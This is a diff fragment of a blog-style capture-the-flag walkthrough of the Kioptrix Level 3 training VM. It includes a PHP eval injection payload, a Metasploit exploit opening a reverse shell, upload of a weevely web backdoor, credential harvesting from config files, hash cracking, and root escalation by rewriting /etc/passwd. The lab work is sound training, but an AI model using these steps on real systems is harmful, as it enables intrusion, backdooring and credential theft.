+</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
+</span><span class='line'>+ 6543 requests: 0 error(s) and 16 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2015-04-25 20:44:21 (GMT2) (8 seconds)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After browsing the web page, we can find several vulnerabilities.</p>
+
+<p>SQL injection:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://kioptrix3.com/gallery/gallery.php?id=1%27</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Remote Code execution:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /index.php HTTP/1.1
+</span><span class='line'>Host: kioptrix3.com
+</span><span class='line'>User-Agent: Mozilla
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>Cookie: PHPSESSID=cd5a425d8b3a044f54c070eb10470ff1
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Cache-Control: max-age=0
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Content-Length: 30
+</span><span class='line'>
+</span><span class='line'>page=index');eval(phpinfo());#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The second one has a Metasploit module that we can use (for LotusCMS):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf > use exploit/multi/http/lcms_php_exec 
+</span><span class='line'>msf exploit(lcms_php_exec) > show options 
+</span><span class='line'>
+</span><span class='line'>Module options (exploit/multi/http/lcms_php_exec):
+</span><span class='line'>
+</span><span class='line'>   Name     Current Setting  Required  Description
+</span><span class='line'>   ----     ---------------  --------  -----------
+</span><span class='line'>   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span class='line'>   RHOST                     yes       The target address
+</span><span class='line'>   RPORT    80               yes       The target port
+</span><span class='line'>   URI      /lcms/           yes       URI
+</span><span class='line'>   VHOST                     no        HTTP server virtual host
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Exploit target:
+</span><span class='line'>
+</span><span class='line'>   Id  Name
+</span><span class='line'>   --  ----
+</span><span class='line'>   0   Automatic LotusCMS 3.0
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>msf exploit(lcms_php_exec) > set RHOST kioptrix3.com
+</span><span class='line'>RHOST => kioptrix3.com
+</span><span class='line'>msf exploit(lcms_php_exec) > set URI /
+</span><span class='line'>URI => /
+</span><span class='line'>msf exploit(lcms_php_exec) > exploit 
+</span><span class='line'>
+</span><span class='line'>[*] Started reverse handler on 192.168.80.137:4444 
+</span><span class='line'>[*] Using found page param: /index.php?page=index
+</span><span class='line'>[*] Sending exploit ...
+</span><span class='line'>[*] Sending stage (40499 bytes) to 192.168.80.145
+</span><span class='line'>[*] Meterpreter session 1 opened (192.168.80.137:4444 -> 192.168.80.145:54507) at 2015-04-25 20:16:36 +0200</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We invoke a few commands to obtain the shell and upload weevely.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter > sysinfo
+</span><span class='line'>Computer    : Kioptrix3
+</span><span class='line'>OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+</span><span class='line'>Meterpreter : php/php
+</span><span class='line'>
+</span><span class='line'>meterpreter > shell
+</span><span class='line'>Process 4662 created.
+</span><span class='line'>id
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>
+</span><span class='line'>cat /etc/passwd
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
+</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
+</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
+</span><span class='line'>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
+</span><span class='line'>dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
+</span><span class='line'>
+</span><span class='line'>uname -a
+</span><span class='line'>Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# weevely generate 1234
+</span><span class='line'>[generate.php] Backdoor file 'weevely.php' created with password '1234'
+</span><span class='line'>
+</span><span class='line'>meterpreter > upload /root/weevely.php /home/www/kioptrix3.com/cache/
+</span><span class='line'>[*] uploading  : /root/weevely.php -> /home/www/kioptrix3.com/cache/
+</span><span class='line'>[*] uploaded   : /root/weevely.php -> /home/www/kioptrix3.com/cache//weevely.php
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# weevely http://kioptrix3.com/cache/weevely.php 1234
+</span><span class='line'>
+</span><span class='line'>www-data@:/home/www/kioptrix3.com $ :audit.userfiles 
+</span><span class='line'>+--------------------------------+--------+----------+--+--+
+</span><span class='line'>| /home/loneferret/.bash_history | exists | readable |  |  |
+</span><span class='line'>| /home/loneferret/.ssh          | exists |          |  |  |
+</span><span class='line'>| /home/dreg/.profile            | exists | readable |  |  |
+</span><span class='line'>| /home/dreg/.bashrc             | exists | readable |  |  |
+</span><span class='line'>| /home/loneferret/.profile      | exists | readable |  |  |
+</span><span class='line'>| /home/dreg/.bash_logout        | exists | readable |  |  |
+</span><span class='line'>| /home/loneferret/.bash_logout  | exists | readable |  |  |
+</span><span class='line'>| /home/loneferret/.bashrc       | exists | readable |  |  |
+</span><span class='line'>+--------------------------------+--------+----------+--+--+
+</span><span class='line'>
+</span><span class='line'>www-data@:/etc/apache2 $ cat /etc/apache2/conf.d/phpmyadmin.conf | grep htpasswd
+</span><span class='line'>AuthUserFile /etc/phpmyadmin/htpasswd.setup
+</span><span class='line'>                AuthUserFile /etc/phpmyadmin/htpasswd.setup
+</span><span class='line'>www-data@:/etc/apache2 $ cat /etc/phpmyadmin/htpasswd.setup
+</span><span class='line'>admin:*
+</span><span class='line'>
+</span><span class='line'>www-data@:/home/www/kioptrix3.com $ cat gallery/gconfig.php
+</span><span class='line'>        $GLOBALS["gallarific_mysql_server"] = "localhost";
+</span><span class='line'>        $GLOBALS["gallarific_mysql_database"] = "gallery";
+</span><span class='line'>        $GLOBALS["gallarific_mysql_username"] = "root";
+</span><span class='line'>        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can log to phpmyadmin (found for example by Nikto) with root / fuckeyou credentials:</p>
+
+<p>We found the several interesting things:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Browse gallarific_users: admin / n0t7t1k4</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In dev_accounts we have:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dreg 0d3eccfb887aabd50f243b3f155c0f85 
+</span><span class='line'>loneferret 5badcaf789d3d1d09794d8f021f40f0e</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using John The Ripper password cracker:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# cat pass 
+</span><span class='line'>loneferret:5badcaf789d3d1d09794d8f021f40f0e:::::::
+</span><span class='line'>dreg:0d3eccfb887aabd50f243b3f155c0f85:::::::
+</span><span class='line'>..
+</span><span class='line'>root@kali32:~# john pass --format=raw-md5 --show
+</span><span class='line'>loneferret:starwars:::::::
+</span><span class='line'>dreg:Mast3r:::::::
+</span><span class='line'>
+</span><span class='line'>2 password hashes cracked, 0 left</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log as loneferret user and after listing sudo -l we will see that the HT
+Editor could be invoked.</p>
+
+<p>In editor running with the root privileges we change the /etc/passwd entry
+according:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dreg:x:0:0:Dreg Gevans,0,555-5566,:/home/dreg:/bin/bash                                                                             │</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log in as dreg / Mast3r with root privileges and read the congratulation
+file, there is some information about alternative solutions / exploits:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@Kioptrix3:/root# cat Congrats.txt
+</span><span class='line'>Good for you for getting here.
+</span><span class='line'>Regardless of the matter (staying within the spirit of the game of course)
+</span><span class='line'>you got here, congratulations are in order. Wasn't that bad now was it.
+</span><span class='line'>
+</span><span class='line'>Went in a different direction with this VM. Exploit based challenges are
+</span><span class='line'>nice. Helps workout that information gathering part, but sometimes we
+</span><span class='line'>need to get our hands dirty in other things as well.
+</span><span class='line'>Again, these VMs are beginner and not intented for everyone.
+</span><span class='line'>Difficulty is relative, keep that in mind.
+</span><span class='line'>
+</span><span class='line'>The object is to learn, do some research and have a little (legal)
+</span><span class='line'>fun in the process.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>I hope you enjoyed this third challenge.
+</span><span class='line'>
+</span><span class='line'>Steven McElrea
+</span><span class='line'>aka loneferret
+</span><span class='line'>http://www.kioptrix.com
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Credit needs to be given to the creators of the gallery webapp and CMS used
+</span><span class='line'>for the building of the Kioptrix VM3 site.
+</span><span class='line'>
+</span><span class='line'>Main page CMS:
+</span><span class='line'>http://www.lotuscms.org
+</span><span class='line'>
+</span><span class='line'>Gallery application:
+</span><span class='line'>Gallarific 2.1 - Free Version released October 10, 2009
+</span><span class='line'>http://www.gallarific.com
+</span><span class='line'>Vulnerable version of this application can be downloaded
+</span><span class='line'>from the Exploit-DB website:
+</span><span class='line'>http://www.exploit-db.com/exploits/15891/
+</span><span class='line'>
+</span><span class='line'>The HT Editor can be found here:
+</span><span class='line'>http://hte.sourceforge.net/downloads.html
+</span><span class='line'>And the vulnerable version on Exploit-DB here:
+</span><span class='line'>http://www.exploit-db.com/exploits/17083/
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Also, all pictures were taken from Google Images, so being part of the
+</span><span class='line'>public domain I used them.</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
